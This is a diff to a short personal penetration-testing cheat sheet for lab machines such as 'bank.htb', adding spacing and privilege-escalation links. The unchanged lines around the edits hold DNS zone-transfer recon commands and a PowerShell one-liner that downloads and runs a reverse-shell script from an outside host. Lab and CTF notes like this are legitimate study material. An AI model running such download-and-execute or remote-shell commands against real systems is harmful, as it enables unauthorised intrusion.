@@ -34,10 +34,14 @@ SERVER 10.10.10.161
 - 10.10.10.161
 
 dnsrecon -r 127.0.0.0/24 -n 10.10.10.161
+
 dnsrecon -r 127.0.1.0/24 -n 10.10.10.161
+
 dnsrecon -r 10.10.10.0/24 -n 10.10.10.161
 
+
 dig axfr @10.10.10.161
+
 dig axfr bank.htb @10.10.10.161
 
 # Upgrading Reverse Shells to be Fully Interactive
@@ -73,7 +77,13 @@ Windows Site:
 - C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.webClient).downloadString('http://10.10.10.10:8000/Invoke-PowerShellTcp.ps1')
 
 # Privilige Escalation
+
+-Windows
+
 https://guif.re/windowseop?fbclid=IwAR2fwsD6D7XjFhZbD4IGSTHtQkGs5D7HXEwVEnCYSQEDWzsuqds8geOi7uc#EoP%208:%20Kernel%20vulnerabilities
 
 https://www.scip.ch/en/?labs.20181011
+
+- Linux
+https://gtfobins.github.io/
 
